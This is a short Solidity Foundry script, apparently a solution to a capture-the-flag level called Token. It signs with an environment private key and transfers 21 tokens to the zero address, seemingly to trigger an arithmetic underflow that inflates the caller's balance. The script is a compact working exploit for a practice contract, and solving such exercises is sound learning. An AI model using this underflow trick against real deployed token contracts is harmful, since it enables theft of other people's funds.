// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Token} from "../src/Token.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(<Contract_address>);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Initial balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        tokenInstance.transfer(address(0), 21); 
        
        console.log("New balance:", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }   
}
